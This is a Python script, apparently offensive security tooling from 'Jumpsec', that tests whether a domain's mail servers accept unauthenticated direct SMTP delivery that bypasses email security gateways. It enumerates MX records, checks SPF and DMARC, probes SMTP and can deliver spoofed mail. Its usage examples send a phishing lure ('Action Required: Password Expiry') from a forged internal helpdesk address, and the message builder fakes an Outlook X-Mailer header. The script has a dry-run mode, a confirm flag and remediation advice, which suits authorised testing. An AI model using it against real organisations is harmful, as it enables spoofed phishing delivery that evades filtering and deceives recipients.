#!/usr/bin/env python3
"""
direct_send_test.py — Direct Send / Direct-to-MX Attack Tester
Jumpsec Offensive Security Tooling

Tests whether a target mail server accepts unauthenticated SMTP connections
directly, bypassing SEG/gateway filtering layers (e.g. Mimecast, Proofpoint).

Usage:
    python3 direct_send_test.py -d target.com -f attacker@domain.com -t victim@target.com [options]

Modes:
    --probe-only    Enumerate MX records and test SMTP banner/EHLO only (no mail sent)
    --dry-run       Full SMTP handshake through to DATA, but abort before final '.'
    --send          Full delivery (requires --confirm)

Examples:
    # Passive probe — just check what MX records exist and whether SMTP responds
    python3 direct_send_test.py -d target.com --probe-only

    # Dry run — walk SMTP session without actually sending
    python3 direct_send_test.py -d target.com -f test@attacker.com -t user@target.com --dry-run

    # Full send with custom subject/body
    python3 direct_send_test.py -d target.com -f it-helpdesk@target.com -t user@target.com \\
        --subject "Action Required: Password Expiry" --body-file lure.html --send --confirm

    # Test specific IP/host (e.g. known backend MX bypassing SEG)
    python3 direct_send_test.py -d target.com -H mail-backend.target.com -p 25 --probe-only

    # Test M365 direct-to-EOP endpoint
    python3 direct_send_test.py -d target.com --eop --probe-only

Author: Jumpsec
"""

import argparse
import dns.resolver
import smtplib
import socket
import ssl
import sys
import json
import re
import time
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate, make_msgid
from dataclasses import dataclass, field, asdict
from typing import Optional


# ─── Colour output ───────────────────────────────────────────────────────────

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def info(msg):  print(f"{C.CYAN}[*]{C.RESET} {msg}")
def good(msg):  print(f"{C.GREEN}[+]{C.RESET} {msg}")
def warn(msg):  print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def bad(msg):   print(f"{C.RED}[-]{C.RESET} {msg}")
def bold(msg):  print(f"{C.BOLD}{msg}{C.RESET}")


# ─── Data structures ─────────────────────────────────────────────────────────

@dataclass
class MXRecord:
    hostname: str
    priority: int
    resolved_ips: list = field(default_factory=list)

@dataclass
class SMTPProbeResult:
    host: str
    port: int
    ip: Optional[str] = None
    reachable: bool = False
    banner: Optional[str] = None
    ehlo_response: Optional[str] = None
    starttls_supported: bool = False
    auth_advertised: bool = False
    auth_mechanisms: list = field(default_factory=list)
    open_relay: bool = False
    accepted_rcpt: bool = False
    delivery_attempted: bool = False
    delivery_confirmed: bool = False
    error: Optional[str] = None
    smtp_log: list = field(default_factory=list)
    note: Optional[str] = None


# ─── DNS helpers ─────────────────────────────────────────────────────────────

def resolve_mx(domain: str) -> list[MXRecord]:
    records = []
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        for rdata in sorted(answers, key=lambda r: r.preference):
            hostname = str(rdata.exchange).rstrip('.')
            ips = []
            try:
                a_answers = dns.resolver.resolve(hostname, 'A')
                ips = [str(r) for r in a_answers]
            except Exception:
                pass
            records.append(MXRecord(hostname=hostname, priority=rdata.preference, resolved_ips=ips))
    except dns.resolver.NXDOMAIN:
        bad(f"Domain {domain} does not exist.")
    except dns.resolver.NoAnswer:
        bad(f"No MX records found for {domain}.")
    except Exception as e:
        bad(f"MX resolution error: {e}")
    return records


def get_eop_endpoint(domain: str) -> Optional[str]:
    """Attempt to derive the direct Exchange Online Protection (EOP) endpoint.
    Format: <tenant>.mail.protection.outlook.com
    Derived from TXT/MX records where possible.
    """
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        for rdata in answers:
            host = str(rdata.exchange).rstrip('.')
            if 'mail.protection.outlook.com' in host:
                return host
    except Exception:
        pass

    # Fallback: derive from domain name (common tenant naming)
    tenant = domain.split('.')[0]
    candidate = f"{tenant}-com.mail.protection.outlook.com"
    info(f"EOP endpoint derived (not confirmed): {candidate}")
    return candidate


def check_spf(domain: str) -> None:
    info(f"Checking SPF record for {domain}...")
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for rdata in answers:
            txt = b''.join(rdata.strings).decode(errors='replace')
            if txt.startswith('v=spf1'):
                if '-all' in txt:
                    good(f"SPF: {txt}")
                    info("SPF policy is -all (hard fail) — direct sends may be rejected by receiving server if SPF is enforced")
                elif '~all' in txt:
                    warn(f"SPF: {txt}")
                    warn("SPF policy is ~all (softfail) — mail may still be accepted")
                elif '?all' in txt or '+all' in txt:
                    bad(f"SPF: {txt}")
                    bad("SPF policy is permissive — weak protection")
                else:
                    warn(f"SPF: {txt}")
    except Exception as e:
        warn(f"Could not retrieve SPF: {e}")


def check_dmarc(domain: str) -> None:
    info(f"Checking DMARC record for {domain}...")
    try:
        answers = dns.resolver.resolve(f"_dmarc.{domain}", 'TXT')
        for rdata in answers:
            txt = b''.join(rdata.strings).decode(errors='replace')
            if txt.startswith('v=DMARC1'):
                policy_match = re.search(r'p=(\w+)', txt)
                policy = policy_match.group(1) if policy_match else 'unknown'
                if policy == 'reject':
                    good(f"DMARC: {txt}")
                    info("DMARC policy=reject — spoofed sender will likely be blocked at receiving server level")
                elif policy == 'quarantine':
                    warn(f"DMARC: {txt}")
                    warn("DMARC policy=quarantine — mail may land in spam/junk")
                else:
                    bad(f"DMARC: {txt}")
                    bad("DMARC policy=none — no enforcement, spoofed mail may pass")
    except dns.resolver.NXDOMAIN:
        bad("No DMARC record found — no DMARC enforcement")
    except Exception as e:
        warn(f"Could not retrieve DMARC: {e}")


# ─── SMTP probing ─────────────────────────────────────────────────────────────

PORTS = [25, 587, 465]

def probe_smtp(
    host: str,
    port: int,
    mail_from: Optional[str],
    rcpt_to: Optional[str],
    message: Optional[MIMEMultipart],
    mode: str,  # 'probe', 'dry-run', 'send'
    timeout: int = 15
) -> SMTPProbeResult:

    result = SMTPProbeResult(host=host, port=port)
    log = result.smtp_log

    try:
        # Resolve IP
        try:
            result.ip = socket.gethostbyname(host)
        except Exception:
            result.ip = "unresolved"

        info(f"  Connecting to {host}:{port} ({result.ip})...")

        if port == 465:
            # SMTPS — implicit TLS
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            smtp = smtplib.SMTP_SSL(host, port, timeout=timeout, context=context)
        else:
            smtp = smtplib.SMTP(host, port, timeout=timeout)

        result.reachable = True
        smtp.set_debuglevel(0)

        # Capture banner
        try:
            result.banner = smtp.sock.recv(1024).decode(errors='replace').strip() if port != 465 else "(SMTPS — banner implicit)"
        except Exception:
            result.banner = "(could not capture banner separately)"

        log.append(f"BANNER: {result.banner}")
        good(f"  Banner: {result.banner}")

        # EHLO
        code, resp = smtp.ehlo('mail.pentestlab.local')
        ehlo_text = resp.decode(errors='replace') if isinstance(resp, bytes) else resp
        result.ehlo_response = ehlo_text
        log.append(f"EHLO 250: {ehlo_text}")

        caps = ehlo_text.upper()
        result.starttls_supported = 'STARTTLS' in caps
        result.auth_advertised = 'AUTH' in caps

        if result.starttls_supported:
            good(f"  STARTTLS advertised")
        if result.auth_advertised:
            auth_line = [l for l in ehlo_text.splitlines() if 'AUTH' in l.upper()]
            result.auth_mechanisms = auth_line[0].upper().replace('AUTH', '').split() if auth_line else []
            warn(f"  AUTH advertised (mechanisms: {' '.join(result.auth_mechanisms) or 'unknown'})")
            info("  Note: AUTH advertised ≠ AUTH required — testing if mail accepted without credentials")

        # Upgrade to TLS if available and not already encrypted
        if result.starttls_supported and port != 465:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                smtp.starttls(context=context)
                smtp.ehlo('mail.pentestlab.local')
                good(f"  STARTTLS upgrade successful")
                log.append("STARTTLS: upgraded")
            except Exception as e:
                warn(f"  STARTTLS upgrade failed: {e} — continuing in plaintext")

        if mode == 'probe' or not mail_from or not rcpt_to:
            smtp.quit()
            result.note = "Probe only — SMTP reachable and responsive"
            return result

        # ── MAIL FROM ────────────────────────────────────────────────────────
        info(f"  MAIL FROM: <{mail_from}>")
        code, resp = smtp.mail(mail_from)
        log.append(f"MAIL FROM: {code} {resp}")
        if code not in (250, 251):
            result.error = f"MAIL FROM rejected: {code} {resp}"
            warn(f"  MAIL FROM rejected ({code})")
            smtp.quit()
            return result
        good(f"  MAIL FROM accepted ({code})")

        # ── RCPT TO ──────────────────────────────────────────────────────────
        info(f"  RCPT TO: <{rcpt_to}>")
        code, resp = smtp.rcpt(rcpt_to)
        log.append(f"RCPT TO: {code} {resp}")
        if code in (250, 251):
            result.accepted_rcpt = True
            good(f"  RCPT TO accepted ({code}) — recipient exists and server will relay")
        elif code == 550:
            warn(f"  RCPT TO rejected 550 — recipient unknown or relaying denied")
            result.error = f"RCPT rejected: {code}"
            smtp.quit()
            return result
        else:
            warn(f"  RCPT TO response: {code} — {resp}")
            smtp.quit()
            return result

        # ── DATA phase ───────────────────────────────────────────────────────
        if mode == 'dry-run':
            info(f"  Dry-run: initiating DATA then aborting (sending RSET)")
            try:
                code, resp = smtp.docmd("DATA")
                log.append(f"DATA: {code} {resp}")
                if code == 354:
                    good(f"  Server accepted DATA command (354) — would accept message body")
                    result.delivery_attempted = True
                    smtp.docmd("RSET")
                    result.note = "Dry-run: DATA accepted, RSET sent — no mail delivered"
                else:
                    warn(f"  DATA command returned: {code}")
            except Exception as e:
                warn(f"  DATA phase error: {e}")
            smtp.quit()
            return result

        # ── Full send ────────────────────────────────────────────────────────
        if mode == 'send':
            info(f"  Sending message body...")
            result.delivery_attempted = True
            try:
                smtp.sendmail(mail_from, rcpt_to, message.as_string())
                result.delivery_confirmed = True
                good(f"  Message accepted for delivery — server returned 250 OK")
                log.append("SEND: 250 OK")
            except smtplib.SMTPDataError as e:
                result.error = str(e)
                bad(f"  SMTP DATA error: {e}")
            smtp.quit()
            return result

    except smtplib.SMTPConnectError as e:
        result.error = f"Connection refused or timeout: {e}"
        bad(f"  Connection failed: {e}")
    except smtplib.SMTPServerDisconnected as e:
        result.error = f"Server disconnected: {e}"
        bad(f"  Disconnected: {e}")
    except socket.timeout:
        result.error = "Connection timed out"
        bad(f"  Timed out connecting to {host}:{port}")
    except ConnectionRefusedError:
        result.error = "Connection refused"
        bad(f"  Port {port} refused connection")
    except Exception as e:
        result.error = str(e)
        bad(f"  Unexpected error: {e}")

    return result


# ─── Message builder ─────────────────────────────────────────────────────────

def build_message(mail_from: str, rcpt_to: str, subject: str, body: str, html: bool) -> MIMEMultipart:
    msg = MIMEMultipart('alternative')
    msg['From'] = mail_from
    msg['To'] = rcpt_to
    msg['Subject'] = subject
    msg['Date'] = formatdate(localtime=True)
    msg['Message-ID'] = make_msgid(domain=mail_from.split('@')[-1] if '@' in mail_from else 'test.local')
    msg['X-Mailer'] = 'Microsoft Outlook 16.0'
    msg['X-Direct-Send-Test'] = 'true'

    if html:
        msg.attach(MIMEText(body, 'html'))
    else:
        msg.attach(MIMEText(body, 'plain'))
    return msg


# ─── Reporting ────────────────────────────────────────────────────────────────

def print_summary(mx_records: list, results: list, domain: str) -> None:
    bold(f"\n{'═'*60}")
    bold(f"  DIRECT SEND TEST SUMMARY — {domain}")
    bold(f"{'═'*60}")

    print(f"\n  MX Records ({len(mx_records)} found):")
    for mx in mx_records:
        print(f"    [{mx.priority:3}] {mx.hostname}  →  {', '.join(mx.resolved_ips) or 'unresolved'}")

    print(f"\n  SMTP Probe Results:")
    vulnerable = []
    for r in results:
        status = f"{C.GREEN}REACHABLE{C.RESET}" if r.reachable else f"{C.RED}UNREACHABLE{C.RESET}"
        rcpt   = f" | {C.GREEN}RCPT ACCEPTED{C.RESET}" if r.accepted_rcpt else ""
        sent   = f" | {C.GREEN}DELIVERED{C.RESET}" if r.delivery_confirmed else ""
        dryrun = f" | {C.YELLOW}DATA ACCEPTED (dry-run){C.RESET}" if r.delivery_attempted and not r.delivery_confirmed else ""
        print(f"    {r.host}:{r.port}  →  {status}{rcpt}{sent}{dryrun}")
        if r.note:
            print(f"         {C.CYAN}Note:{C.RESET} {r.note}")
        if r.error:
            print(f"         {C.RED}Error:{C.RESET} {r.error}")
        if r.accepted_rcpt or r.delivery_confirmed:
            vulnerable.append(r)

    print()
    if vulnerable:
        bad(f"  VULNERABLE: Mail server accepts direct connections without authentication.")
        for v in vulnerable:
            bad(f"  → {v.host}:{v.port} — RCPT accepted={'YES' if v.accepted_rcpt else 'NO'} | Delivered={'YES' if v.delivery_confirmed else 'NO'}")
        print()
        warn("  Bypass confirmed: mail delivered without transiting SEG/gateway.")
        warn("  Recommendations:")
        warn("    - Restrict inbound SMTP to SEG IP ranges only")
        warn("    - For M365: configure inbound connector locked to SEG source IPs")
        warn("    - Enable Enhanced Filtering for Connectors (M365)")
        warn("    - Review MTA-STS policy for the domain")
    else:
        good("  No direct send vulnerability confirmed on tested hosts/ports.")


def save_json(results: list, mx_records: list, domain: str, path: str) -> None:
    output = {
        "target_domain": domain,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "mx_records": [asdict(mx) for mx in mx_records],
        "smtp_results": [asdict(r) for r in results]
    }
    with open(path, 'w') as f:
        json.dump(output, f, indent=2)
    good(f"Results saved to {path}")


# ─── Entry point ─────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        description="Direct Send / Direct-to-MX attack tester for authorised engagements",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    p.add_argument('-d', '--domain',    required=True, help="Target domain (e.g. target.com)")
    p.add_argument('-f', '--from-addr', dest='mail_from', help="Sender address (MAIL FROM)")
    p.add_argument('-t', '--to-addr',   dest='rcpt_to',   help="Recipient address (RCPT TO)")
    p.add_argument('-H', '--host',      help="Override: test specific host instead of MX lookup")
    p.add_argument('-p', '--port',      type=int, default=None, help="Override: specific port (default: try 25, 587, 465)")
    p.add_argument('--eop',             action='store_true', help="Also test M365 direct-to-EOP endpoint")
    p.add_argument('--subject',         default="Direct Send Test", help="Email subject")
    p.add_argument('--body',            default="This is a direct send test email.", help="Email body (plain text)")
    p.add_argument('--body-file',       help="Path to HTML/text file to use as body")
    p.add_argument('--html',            action='store_true', help="Treat body as HTML")
    p.add_argument('--timeout',         type=int, default=15, help="SMTP connection timeout in seconds")
    p.add_argument('--probe-only',      action='store_true', help="Only probe SMTP — do not attempt MAIL FROM/RCPT TO")
    p.add_argument('--dry-run',         action='store_true', help="Full SMTP handshake but abort before message delivery")
    p.add_argument('--send',            action='store_true', help="Fully send test email (requires --confirm)")
    p.add_argument('--confirm',         action='store_true', help="Required with --send to prevent accidental delivery")
    p.add_argument('--json',            dest='json_output', help="Save results to JSON file")
    p.add_argument('--all-ports',       action='store_true', help="Test all of 25, 587, 465 per host")
    return p.parse_args()


def main():
    args = parse_args()

    bold(f"\n  Direct Send Tester — Jumpsec")
    bold(f"  Target: {args.domain}\n")

    # Mode validation
    if args.send and not args.confirm:
        bad("--send requires --confirm to prevent accidental delivery. Add --confirm to proceed.")
        sys.exit(1)

    if args.send and (not args.mail_from or not args.rcpt_to):
        bad("--send requires --from-addr and --to-addr")
        sys.exit(1)

    if args.dry_run and (not args.mail_from or not args.rcpt_to):
        bad("--dry-run requires --from-addr and --to-addr")
        sys.exit(1)

    mode = 'probe'
    if args.dry_run:
        mode = 'dry-run'
    elif args.send and args.confirm:
        mode = 'send'

    # DNS recon
    bold("[ Phase 1: DNS Recon ]")
    check_spf(args.domain)
    check_dmarc(args.domain)

    # MX records
    bold("\n[ Phase 2: MX Enumeration ]")
    mx_records = []

    if args.host:
        info(f"Using override host: {args.host}")
        mx_records = [MXRecord(hostname=args.host, priority=0)]
    else:
        mx_records = resolve_mx(args.domain)
        if not mx_records:
            bad("No MX records found. Exiting.")
            sys.exit(1)
        for mx in mx_records:
            good(f"  [{mx.priority:3}] {mx.hostname}  ({', '.join(mx.resolved_ips) or 'unresolved'})")

    if args.eop:
        eop = get_eop_endpoint(args.domain)
        if eop:
            mx_records.append(MXRecord(hostname=eop, priority=999))
            info(f"Added EOP endpoint to test list: {eop}")

    # Build message if needed
    message = None
    if mode in ('send',) and args.mail_from and args.rcpt_to:
        body = args.body
        html = args.html
        if args.body_file:
            try:
                with open(args.body_file, 'r') as f:
                    body = f.read()
                html = True
            except Exception as e:
                warn(f"Could not read body file: {e} — using default body")
        message = build_message(args.mail_from, args.rcpt_to, args.subject, body, html)

    # SMTP probing
    bold("\n[ Phase 3: SMTP Probing ]")
    results = []

    ports_to_test = [args.port] if args.port else (PORTS if args.all_ports else [25, 587])

    for mx in mx_records:
        bold(f"\n  Target: {mx.hostname}")
        for port in ports_to_test:
            info(f"  Testing port {port}...")
            result = probe_smtp(
                host=mx.hostname,
                port=port,
                mail_from=args.mail_from if mode != 'probe' else None,
                rcpt_to=args.rcpt_to if mode != 'probe' else None,
                message=message,
                mode=mode,
                timeout=args.timeout
            )
            results.append(result)
            time.sleep(0.5)

    # Summary
    print_summary(mx_records, results, args.domain)

    # JSON output
    if args.json_output:
        save_json(results, mx_records, args.domain, args.json_output)


if __name__ == '__main__':
    main()
